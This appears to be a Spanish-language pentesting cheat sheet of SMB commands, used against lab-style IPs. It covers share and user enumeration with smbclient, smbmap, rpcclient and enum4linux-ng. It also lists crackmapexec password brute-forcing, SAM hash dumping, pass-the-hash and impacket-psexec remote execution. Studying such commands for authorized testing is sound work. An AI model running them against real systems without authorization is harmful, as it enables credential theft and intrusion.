## Enumeración

| Comando                                                                                                                                           | Descripción                                                                                                                                                                                              | Ejemplo                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| smbclient -N -L //1.2.3.4                                                                                                                         | Numera recursos compartidos                                                                                                                                                                              | smbclient -N -L //10.129.14.128                     |
| smbmap -H <ip_víctima>                                                                                                                            | Numera recursos compartidos                                                                                                                                                                              | smbmap -H 10.129.14.128                             |
| smbmap -H <ip_víctima> -r <nombre_recurso>                                                                                                        | Numera de forma recursiva los archivos que se encuentren dentro de dicho recurso                                                                                                                         | smbmap -H 10.129.14.128 -r notes                    |
| smbmap -H 10.129.14.128 --download "<nombre_recurso>\<nombre_archivo>"                                                                            | Descarga un archivo de un recurso concreto compartido                                                                                                                                                    | smbmap -H 10.129.14.128 --download "notes\note.txt" |
| smbmap -H <ip_víctima> --download "<SHARE\path_al_archivo>" -u <\usuario> -p '<\contraseña>'                                                      | Mapea/lista recursos SMB y permite descargar archivos desde un share remoto. --download descarga el fichero indicado (ruta SHARE\archivo o SHARE\carpeta\archivo) usando las credenciales suministradas. |                                                     |
| smbmap -H 10.129.14.128 --upload "<nombre_recurso>\<nombre_archivo>"                                                                              | Carga un archivo de un recurso concreto compartido                                                                                                                                                       | smbmap -H 10.129.14.128 --download "notes\test.txt" |
| smbclient //1.2.3.4/<nombre_rescurso>                                                                                                             | Acceder a un recurso compartido concreto                                                                                                                                                                 |                                                     |
| smb: \> ls / cd / get                                                                                                                             | Dentro del recurso de SMB, puedo listar directorios, acceder o descargar.                                                                                                                                |                                                     |
| rpcclient -U "%" 1.2.3.4                                                                                                                          | Puedo realizar varias solicitudes para obtener información. Estas son las siguientes (ver comandos a posterior):                                                                                         |                                                     |
| rpc_client> `srvinfo`                                                                                                                             | Muestra información general del servidor.                                                                                                                                                                |                                                     |
| rpc_client>`enumdomains`                                                                                                                          | Enumera todos los dominios visibles en la red.                                                                                                                                                           |                                                     |
| rpc_client>`querydominfo`                                                                                                                         | Muestra detalles del dominio, usuarios y controladores.                                                                                                                                                  |                                                     |
| rpc_client>`netshareenumall`                                                                                                                      | Lista todos los recursos compartidos disponibles (shares).                                                                                                                                               |                                                     |
| rpc_client>`netsharegetinfo <nombre_recurso>`                                                                                                     | Muestra información detallada sobre un recurso compartido específico.                                                                                                                                    |                                                     |
| rpc_client>`enumdomusers`                                                                                                                         | Enumera todos los usuarios del dominio.                                                                                                                                                                  |                                                     |
| rpc_client>`queryuser <RID>`                                                                                                                      | Proporciona información detallada sobre un usuario (requiere RID). Ver comando `enumdomusers`                                                                                                            |                                                     |
| `smbmap -H 1.2.3.4`                                                                                                                               | Numera recursos compartidos                                                                                                                                                                              |                                                     |
| `crackmapexec smb 10.129.14.128 --shares -u '' -p '' `                                                                                            | Numera recursos compartidos                                                                                                                                                                              |                                                     |
| >git clone https://github.com/cddmp/enum4linux-ng.git<br>>cd enum4linux-ng<br>>pip3 install -r requirements.txt<br>>./enum4linux-ng.py 1.2.3.4 -A | Enumerar información en servidores SMB/Windows**                                                                                                                                                         |                                                     |
| `cat /etc/samba/smb.conf`                                                                                                                         | Para visualizar las parametros de configuración del servicio SMB.                                                                                                                                        |                                                     |
| smbmap -H <ip_atacante>                                                                                                                           | Numera recursos compartidos                                                                                                                                                                              | smbmap -H 10.129.14.128                             |
## CrackMapExec

| Comando                                                                                           | Descripción                                                                                                                                                                             | Ejemplo                                                                            |
| ------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| crackmapexec smb <ip_víctima> -u /ruta/lista_usuarios.txt -p /ruta/contraseñas.txt (--local-auth) | Fuerza bruta contra credenciales SMB. El parámetro --local-auth hace que CME intente autenticarse contra las cuentas locales (SAM) del host objetivo en lugar de usar dominio/Kerberos. | crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth    |
| crackmapexec smb <ip_víctima> -u \<usuario> -p \<contraseña> --sam                                | Extrae los hashes SAM (Security Account Manager) del sistema remoto si el usuario tiene privilegios administrativos. Permite obtener los hashes de las cuentas locales.                 | crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam             |
| crackmapexec smb <ip_víctima> -u \<usuario> -H \<NTLM_hash>                                       | Autenticación mediante hash NTLM en lugar de contraseña en texto claro (técnica “Pass-the-Hash”). Útil cuando tienes el hash pero no la contraseña.                                     | crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE |
|                                                                                                   |                                                                                                                                                                                         |                                                                                    |
|                                                                                                   |                                                                                                                                                                                         |                                                                                    |
## Varios

| Comando                                            | Descripción                                                                                                                                                                                                                                          | Ejemplo                                                                                 |
| -------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| impacket-psexec \<user>:'<\password>'@<ip_víctima> | Ejecuta comandos remotamente usando SMB/servicio (como PsExec). Requiere credenciales con permisos administrativos en la máquina destino (cuenta local o de dominio). Crea un servicio temporal para ejecutar el payload/COMANDO y luego lo elimina. | impacket-psexec administrator:'Password123!'@10.10.110.17                               |
|                                                    |                                                                                                                                                                                                                                                      | crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users<br> |
|                                                    |                                                                                                                                                                                                                                                      |                                                                                         |



